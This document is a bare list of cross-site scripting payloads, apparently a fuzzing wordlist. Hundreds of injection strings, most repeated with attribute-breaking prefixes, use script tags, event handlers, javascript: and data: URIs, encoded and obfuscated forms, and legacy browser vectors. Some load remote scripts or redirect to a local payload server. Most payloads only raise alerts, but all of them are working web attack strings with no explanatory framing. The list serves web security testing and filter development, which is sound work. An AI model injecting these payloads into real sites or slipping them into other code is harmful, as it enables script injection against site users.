'><style>#test{x:expression(alert(/X/))}</style>
<object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>
"><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>
'><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>​
"><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>​
'><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>​
<meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
"><meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
'><meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
eval("s=document.createElement('script');alert(1);document.getElementsByTagName('head')[0].appendChild(s)")
<meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"
"><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"
'><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"
<meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"
"><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"
'><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html">
"><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html">
'><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html">
javascript:/*–></marquee></script></title></textarea></noscript></style></xmp>”> [img=1]<img -/style=-=expression&#40/*’/-/*',/**/eval(name)//);wi dth:100%;height:100%;position:absolute;behavior:url(#default#VML);-o-link:javascript :eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>”"/>
<img src=”<img src=x”/onerror=alert(1)//”> Jquery: <img/src/onerror=alert(1)>
"><img src=”<img src=x”/onerror=alert(1)//”> Jquery: <img/src/onerror=alert(1)>
'><img src=”<img src=x”/onerror=alert(1)//”> Jquery: <img/src/onerror=alert(1)>
<input id=x><input id=x><script>alert(x)</script>
"><input id=x><input id=x><script>alert(x)</script>
'><input id=x><input id=x><script>alert(x)</script>
<a href="invalid:1" id=x name=y>test</a><a href="invalid:2" id=x name=y>test</a><script>alert(x.y[0])</script>
"><a href="invalid:1" id=x name=y>test</a><a href="invalid:2" id=x name=y>test</a><script>alert(x.y[0])</script>
'><a href="invalid:1" id=x name=y>test</a><a href="invalid:2" id=x name=y>test</a><script>alert(x.y[0])</script>
<script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>
"><script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>
'><script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>
<a href=1 name=x>test</a><a href=1 name=x>test</a><script>alert(x.removeChild)alert(x.parentNode)</script>
"><a href=1 name=x>test</a><a href=1 name=x>test</a><script>alert(x.removeChild)alert(x.parentNode)</script>
'><a href=1 name=x>test</a><a href=1 name=x>test</a><script>alert(x.removeChild)alert(x.parentNode)</script>
<a href="123" id=x>test</a><script>x='javascript:alert(1)';</script>
"><a href="123" id=x>test</a><script>x='javascript:alert(1)';</script>
'><a href="123" id=x>test</a><script>x='javascript:alert(1)';</script>
<form name=self location="javascript:alert(1)"
"><form name=self location="javascript:alert(1)"
'><form name=self location="javascript:alert(1)">
"><form name=self location="javascript:alert(1)"
"><form name=self location="javascript:alert(1)"
'><form name=self location="javascript:alert(1)">
'><form name=self location="javascript:alert(1)"
"><form name=self location="javascript:alert(1)"
'><form name=self location="javascript:alert(1)"></form><script>if(top!=self){top.location=self.location}</script>
"><form name=self location="javascript:alert(1)"></form><script>if(top!=self){top.location=self.location}</script>
'><form name=self location="javascript:alert(1)"></form><script>if(top!=self){top.location=self.location}</script>
<form name=self location="javascript&amp;#58;alert(1)"></form><script>if(top!=self){top.location=self.location}</script>
"><form name=self location="javascript&amp;#58;alert(1)"></form><script>if(top!=self){top.location=self.location}</script>
'><form name=self location="javascript&amp;#58;alert(1)"></form><script>if(top!=self){top.location=self.location}</script>
%3Cimg%20name%3DgetElementsByTagName%20src%3D1%20%20onerror%3Dalert(1)%3E
%3Cform%20onmouseover%3Dalert(1)%3E%3Cinput%20name%3Dattributes%3E
<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x31\x29\x3B'>X
"><a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x31\x29\x3B'>X
'><a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x31\x29\x3B'>X
data:text/html,%3Cscript%3Ealert(1)%3C%2Fscript%3E
window.name//'name="javascript:alert("X")
<svg/onload=location=/java/.source+/script/.source+location.h ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has h[3]//#:()
"><svg/onload=location=/java/.source+/script/.source+location.h ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has h[3]//#:()
'><svg/onload=location=/java/.source+/script/.source+location.h ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has h[3]//#:()
<%div%20style=xss:expression(prompt(1))>
"><%div%20style=xss:expression(prompt(1))>
'><%div%20style=xss:expression(prompt(1))>
%22]);}catch(e){}if(!self.a)self.a=!alert(1);/
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>;
"><script>alert(1)</script>;
'><script>alert(1)</script>;
<script>alert("/X"/)</script>
"><script>alert("/X"/)</script>
'><script>alert("/X"/)</script>
<SCRIPT>a=/X/
"><SCRIPT>a=/X/
'><SCRIPT>a=/X/\nalert(1);</SCRIPT>
"><SCRIPT>a=/X/
"><SCRIPT>a=/X/
'><SCRIPT>a=/X/\nalert(1);</SCRIPT>
'><SCRIPT>a=/X/
"><SCRIPT>a=/X/
'><SCRIPT>a=/X/\nalert(1);</SCRIPT>
<script>alert([!![]]+[])</script>
"><script>alert([!![]]+[])</script>
'><script>alert([!![]]+[])</script>
<script>prompt(-[])</script>
"><script>prompt(-[])</script>
'><script>prompt(-[])</script>
<scr/**/ipt>alert(1)</sc/**/ipt>
"><scr/**/ipt>alert(1)</sc/**/ipt>
'><scr/**/ipt>alert(1)</sc/**/ipt>
#<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
\'><script>X<\/script>
\'><body onload=\'X\'>
><script>X<\/script>
<body onload="X">
"><body onload="X">
'><body onload="X">
<img src="x:X" onerror="alert(1)">
"><img src="x:X" onerror="alert(1)">
'><img src="x:X" onerror="alert(1)">
<img src=a onerror=alert(1)
"><img src=a onerror=alert(1)
'><img src=a onerror=alert(1)%0A>a
"><img src=a onerror=alert(1)%0A>a
'><img src=a onerror=alert(1)%0A>a
onmouseover=alert(1);
<<SCRIPT>alert(1);/
"><<SCRIPT>alert(1);/
'><<SCRIPT>alert(1);/
<SCRIPT>a=/X/
"><SCRIPT>a=/X/
'><SCRIPT>a=/X/
alert(1)
alert(String.fromCharCode(49))
alert(/1/.source)
eval('alert(1)')
this['EvAL'.toLowerCase()]('aLErT(1)'.toLowerCase())
(alert(1)).replace(/.+/,eval);
\u0061\u006c\u0065\u0072\u0074(1)
eval('\u00' + '6' + '1'+'le' + '\u0072' + 't(1)')
eval('\141\154\145\162\164\50\61\51')
eval('\x61\x6c\x65\x72\x74(1)')
eval('\x61ler\x74(1)')
top['a\x6Cert'](1)
x='\x61\x6c\x65\x72\x74\x28\x31\x29';new Function(x)()
setTimeout('alert(1)',0)
setTimeout(\u0061\u006c\u0065\u0072\u0074(1),0);
onerror=eval;throw'alert\x281\x29';
expression(URL=0)
expr\65 ssion(URL=0)
expr\65 ss/*???*/ion(URL=0);
expression\28URL=0\29
expr\65 ss/*\&#x25;/ion\28URL=0\29
\000045xpr\000065 ss/*BlABl/\\aaaaa!!!*
feed:javascript:alert(1)
feed:javascript&colon;alert(1)
feed:data:text/html,%3cscript%3ealert%281%29%3c/script%3e
feed:data:text/html,%3csvg%20onload=alert%281%29%3e
data:text/html,%3Cscript%3Ealert(1)%3C/script%3E
d&#x61;t&#x61;&colon;text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
data:_;;;:;base64_______,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
<LAYER SRC="javascript:alert(1);"></LAYER>
"><LAYER SRC="javascript:alert(1);"></LAYER>
'><LAYER SRC="javascript:alert(1);"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert(1);">
"><LINK REL="stylesheet" HREF="javascript:alert(1);">
'><LINK REL="stylesheet" HREF="javascript:alert(1);">
<!--[if gte IE 4]><SCRIPT>alert(1);</SCRIPT>
"><SCRIPT>alert(1);</SCRIPT>
'><SCRIPT>alert(1);</SCRIPT><![endif]-->
"><!--[if gte IE 4]><SCRIPT>alert(1);</SCRIPT>
"><SCRIPT>alert(1);</SCRIPT>
'><SCRIPT>alert(1);</SCRIPT><![endif]-->
'><!--[if gte IE 4]><SCRIPT>alert(1);</SCRIPT>
"><SCRIPT>alert(1);</SCRIPT>
'><SCRIPT>alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:alert(1);//">
"><BASE HREF="javascript:alert(1);//">
'><BASE HREF="javascript:alert(1);//">
data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
<script>alert(String.fromCharCode(75,67,70))</script>
"><script>alert(String.fromCharCode(75,67,70))</script>
'><script>alert(String.fromCharCode(75,67,70))</script>
<IFRAME SRC="javascript:alert(1);"></IFRAME>
"><IFRAME SRC="javascript:alert(1);"></IFRAME>
'><IFRAME SRC="javascript:alert(1);"></IFRAME>
<iframe src="javascript:alert(1); <
"><iframe src="javascript:alert(1); <
'><iframe src="javascript:alert(1); <
<object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></object>
"><object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></object>
'><object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></object>
<SCRIPT>x=/X/  alert(x.source)</SCRIPT> 
"><SCRIPT>x=/X/  alert(x.source)</SCRIPT> 
'><SCRIPT>x=/X/  alert(x.source)</SCRIPT> 
<BODY ONLOAD=alert(1)>
"><BODY ONLOAD=alert(1)>
'><BODY ONLOAD=alert(1)>
<ScRiPt+>prompt(1)</ScRiPt>
"><ScRiPt+>prompt(1)</ScRiPt>
'><ScRiPt+>prompt(1)</ScRiPt>
<img src=X onerror=alert(1)>
"><img src=X onerror=alert(1)>
'><img src=X onerror=alert(1)>
<img src=/ onerror=alert(1);>
"><img src=/ onerror=alert(1);>
'><img src=/ onerror=alert(1);>
<BODY BACKGROUND="javascript:alert(1)">
"><BODY BACKGROUND="javascript:alert(1)">
'><BODY BACKGROUND="javascript:alert(1)">
<TABLE BACKGROUND="javascript:alert(1)">
"><TABLE BACKGROUND="javascript:alert(1)">
'><TABLE BACKGROUND="javascript:alert(1)">
<IMG SRC='vbscript:msgbox(1)'>
"><IMG SRC='vbscript:msgbox(1)'>
'><IMG SRC='vbscript:msgbox(1)'>
<ScriPt>ALeRt(“ X ”)</scriPt>
"><ScriPt>ALeRt(“ X ”)</scriPt>
'><ScriPt>ALeRt(“ X ”)</scriPt>
<a href="javascript#alert(1);">
"><a href="javascript#alert(1);">
'><a href="javascript#alert(1);">
<div onmouseover="alert(1);">
"><div onmouseover="alert(1);">
'><div onmouseover="alert(1);">
<BR SIZE="&{alert(1)}">
"><BR SIZE="&{alert(1)}">
'><BR SIZE="&{alert(1)}">
&<script>alert(1);</script>
"><script>alert(1);</script>
'><script>alert(1);</script>
&{alert(1);};
<img src=&{alert(1);};>
"><img src=&{alert(1);};>
'><img src=&{alert(1);};>
<img src="mocha:alert(1);">
"><img src="mocha:alert(1);">
'><img src="mocha:alert(1);">
<img src="livescript:alert(1);">
"><img src="livescript:alert(1);">
'><img src="livescript:alert(1);">
<a href="about:<script>alert(1);</script>
"><script>alert(1);</script>
'><script>alert(1);</script>">
[\xC0][\xBC]script>alert(1);[\xC0][\xBC]/script>" };
<object classid="clsid:..." codebase="javascript:alert(1);">
"><object classid="clsid:..." codebase="javascript:alert(1);">
'><object classid="clsid:..." codebase="javascript:alert(1);">
<style><!--</style><script>alert(1);//--></script>
"><style><!--</style><script>alert(1);//--></script>
'><style><!--</style><script>alert(1);//--></script>
<![CDATA[<!--]]<script>alert(1);//--></script>
"><![CDATA[<!--]]<script>alert(1);//--></script>
'><![CDATA[<!--]]<script>alert(1);//--></script>
<!-- -- --><script>alert(1);</script>
"><script>alert(1);</script>
'><script>alert(1);</script><!-- -- -->
javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
<EMBED SRC="http://127.0.0.1:3555/xss_serve_payloads/flash.swf"></EMBED>
"><EMBED SRC="http://127.0.0.1:3555/xss_serve_payloads/flash.swf"></EMBED>
'><EMBED SRC="http://127.0.0.1:3555/xss_serve_payloads/flash.swf"></EMBED>
<img src="http://127.0.0.1:3555/xss_serve_payloads/image.png" onerror=alert(1)>
"><img src="http://127.0.0.1:3555/xss_serve_payloads/image.png" onerror=alert(1)>
'><img src="http://127.0.0.1:3555/xss_serve_payloads/image.png" onerror=alert(1)>
<img src="http://127.0.0.1:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>
"><img src="http://127.0.0.1:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>
'><img src="http://127.0.0.1:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>
<img src="http://127.0.0.1:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>
"><img src="http://127.0.0.1:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>
'><img src="http://127.0.0.1:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>
<img src="http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg" onerror=alert(1)>
"><img src="http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg" onerror=alert(1)>
'><img src="http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg" onerror=alert(1)>
<meta HTTP-EQUIV="REFRESH" content="0; url=http://127.0.0.1:3555/xss_serve_payloads/X.html">
"><meta HTTP-EQUIV="REFRESH" content="0; url=http://127.0.0.1:3555/xss_serve_payloads/X.html">
'><meta HTTP-EQUIV="REFRESH" content="0; url=http://127.0.0.1:3555/xss_serve_payloads/X.html">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="> 
"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="> 
'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="> 
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
<BGSOUND SRC="javascript:alert(1);">
"><BGSOUND SRC="javascript:alert(1);">
'><BGSOUND SRC="javascript:alert(1);">
<script type="text/javascript">window.open("http://127.0.0.1:3555/xss_serve_payloads/X.html","_self");</script>
"><script type="text/javascript">window.open("http://127.0.0.1:3555/xss_serve_payloads/X.html","_self");</script>
'><script type="text/javascript">window.open("http://127.0.0.1:3555/xss_serve_payloads/X.html","_self");</script>
<SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
"><SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
'><SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
<SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
"><SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
'><SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
"><SCRIPT a=">" '' SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
'><SCRIPT a=">" '' SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
"><SCRIPT "a='>'" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
'><SCRIPT "a='>'" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
"><SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
'><SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
"><SCRIPT a=">'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
'><SCRIPT a=">'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
<SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
"><SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
'><SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
<SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
"><SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
'><SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
<SCRIPT a=">" '' SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
"><SCRIPT a=">" '' SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
'><SCRIPT a=">" '' SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
<SCRIPT "a='>'" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
"><SCRIPT "a='>'" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
'><SCRIPT "a='>'" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
<SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
"><SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
'><SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
<SCRIPT a=">'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
"><SCRIPT a=">'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
'><SCRIPT a=">'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
<TABLE><TD BACKGROUND="javascript:alert(1)">
"><TABLE><TD BACKGROUND="javascript:alert(1)">
'><TABLE><TD BACKGROUND="javascript:alert(1)">
<img src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif' onload='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"'>
"><img src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif' onload='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"'>
'><img src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif' onload='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"'>
<img src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif' onload='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"'>
"><img src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif' onload='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"'>
'><img src='http://127.0.0.1:3555/xss_serve_payloads/gif.gif' onload='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"'>
<img src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"'>
"><img src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"'>
'><img src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"'>
<img src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"'>
"><img src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"'>
'><img src='http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif' onerror='document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"'>
<img src='http://127.0.0.1:3555/xss_serve_payloads/X.html' onload=alert(1)//></img>
"><img src='http://127.0.0.1:3555/xss_serve_payloads/X.html' onload=alert(1)//></img>
'><img src='http://127.0.0.1:3555/xss_serve_payloads/X.html' onload=alert(1)//></img>
<script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>
"><script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>
'><script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>
<img src=&#106;&#97;&#118;&#97;&#115;&#99; &#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101; &#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
"><img src=&#106;&#97;&#118;&#97;&#115;&#99; &#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101; &#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
'><img src=&#106;&#97;&#118;&#97;&#115;&#99; &#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101; &#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69 &#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27 &#x58&#x53&#x53&#x27&#x29>
"><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69 &#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27 &#x58&#x53&#x53&#x27&#x29>
'><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69 &#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27 &#x58&#x53&#x53&#x27&#x29>
<img src=&#0000106&#0000097&#0000118&#0000097 &#0000115&#0000099&#0000114&#0000105&#0000112 &#0000116&#0000058&#0000097&#0000108&#0000101 &#0000114&#0000116&#0000040&#0000039&#0000088 &#0000083&#0000083&#0000039&#0000041>
"><img src=&#0000106&#0000097&#0000118&#0000097 &#0000115&#0000099&#0000114&#0000105&#0000112 &#0000116&#0000058&#0000097&#0000108&#0000101 &#0000114&#0000116&#0000040&#0000039&#0000088 &#0000083&#0000083&#0000039&#0000041>
'><img src=&#0000106&#0000097&#0000118&#0000097 &#0000115&#0000099&#0000114&#0000105&#0000112 &#0000116&#0000058&#0000097&#0000108&#0000101 &#0000114&#0000116&#0000040&#0000039&#0000088 &#0000083&#0000083&#0000039&#0000041>
“><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
“><script>alert(String.fromCharCode(75,67,70))</script>
"><script>alert(String.fromCharCode(75,67,70))</script>
'><script>alert(String.fromCharCode(75,67,70))</script>
‘><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
‘><script>alert(String.fromCharCode(75,67,70))</script>
"><script>alert(String.fromCharCode(75,67,70))</script>
'><script>alert(String.fromCharCode(75,67,70))</script>
<ScRIPt>prompt(1)</ScRIPt>
"><ScRIPt>prompt(1)</ScRIPt>
'><ScRIPt>prompt(1)</ScRIPt>
<ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>
"><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>
'><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>
“><ScRIPt>prompt(1)</ScRIPt>
"><ScRIPt>prompt(1)</ScRIPt>
'><ScRIPt>prompt(1)</ScRIPt>
“><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>
"><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>
'><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>
‘><ScRIPt>prompt(1)</ScRIPt>
"><ScRIPt>prompt(1)</ScRIPt>
'><ScRIPt>prompt(1)</ScRIPt>
‘><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>
"><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>
'><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>
</script><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
"></script><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
'></script><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
</script><script>alert(String.fromCharCode(75,67,70))</script>
"></script><script>alert(String.fromCharCode(75,67,70))</script>
'></script><script>alert(String.fromCharCode(75,67,70))</script>
"><script>alert(String.fromCharCode(75,67,70))</script>
'><script>alert(String.fromCharCode(75,67,70))</script>
“/><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
“/><script>alert(String.fromCharCode(75,67,70))</script>
"><script>alert(String.fromCharCode(75,67,70))</script>
'><script>alert(String.fromCharCode(75,67,70))</script>
‘/><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
‘/><script>alert(String.fromCharCode(75,67,70))</script>
"><script>alert(String.fromCharCode(75,67,70))</script>
'><script>alert(String.fromCharCode(75,67,70))</script>
</SCRIPT>”><SCRIPT>prompt(1)</SCRIPT>
"></SCRIPT>”><SCRIPT>prompt(1)</SCRIPT>
'></SCRIPT>”><SCRIPT>prompt(1)</SCRIPT>
</SCRIPT>”><SCRIPT>alert(String.fromCharCode(75,67,70))
"></SCRIPT>”><SCRIPT>alert(String.fromCharCode(75,67,70))
'></SCRIPT>”><SCRIPT>alert(String.fromCharCode(75,67,70))
</SCRIPT>”>”><SCRIPT>prompt(1)</SCRIPT>
"></SCRIPT>”>”><SCRIPT>prompt(1)</SCRIPT>
'></SCRIPT>”>”><SCRIPT>prompt(1)</SCRIPT>
</SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
'></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
